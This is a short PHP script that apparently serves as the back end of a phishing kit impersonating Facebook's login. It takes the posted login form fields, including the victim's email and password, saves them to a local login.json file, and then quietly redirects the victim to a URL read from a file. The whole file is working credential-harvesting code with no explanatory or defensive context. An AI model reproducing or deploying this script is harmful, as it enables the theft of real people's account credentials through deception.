<?php
$data['lsd'] = $_POST['lsd'];
$data['jazoest'] = $_POST['jazoest'];
$data['m_ts'] = $_POST['m_ts'];
$data['li'] = $_POST['li'];
$data['try_number'] = $_POST['try_number'];
$data['unrecognized_tries'] = $_POST['unrecognized_tries'];
$data['email'] = $_POST['email'];
$data['pass'] = $_POST['pass'];
$data['login'] = $_POST['login'];
$data['sign_up'] = $_POST['sign_up'];
$data['bi_xrwh'] = $_POST['bi_xrwh'];
$data['None'] = $_POST['None'];
$data['_fb_noscript'] = $_POST['_fb_noscript'];
$dats = json_encode($data);
$head = fopen("login.json","w");
$f = fwrite($head,$dats);
$ds = fclose($head);
$d = fopen("redurl","r");
$url = fread($d,filesize('redurl'));
echo "$url";
$time = 0;
header("refresh: $time url=$url");
?>
